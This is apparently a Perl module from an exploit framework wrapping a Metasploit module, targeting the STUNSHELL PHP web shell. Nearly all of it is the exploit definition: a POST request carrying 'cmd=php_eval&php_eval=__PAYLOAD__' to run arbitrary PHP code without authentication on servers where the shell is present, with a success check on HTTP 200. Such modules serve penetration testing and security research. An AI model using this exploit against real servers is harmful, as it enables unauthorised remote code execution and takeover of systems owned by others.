package STUNSHELL::MSF::StunshellEval;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "StunshellEval";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits unauthenticated versions of the \"STUNSHELL\" web shell.

        This module works when safe mode is enabled on the web server. This shell is widely

        used in automated RFI payloads.

      ",
  MSF_MODULE => "stunshell_eval",
  OSVDB => 91842,
  REFERENCES => [
    "https://defense.ballastsecurity.net/wiki/index.php/STUNSHELL",
    "https://defense.ballastsecurity.net/decoding/index.php?hash=a4cd8ba05eb6ba7fb86dd66bed968007",
  ],
  TITLE => "STUNSHELL Web Shell Remote PHP Code Execution",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'cmd=php_eval&php_eval=__PAYLOAD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
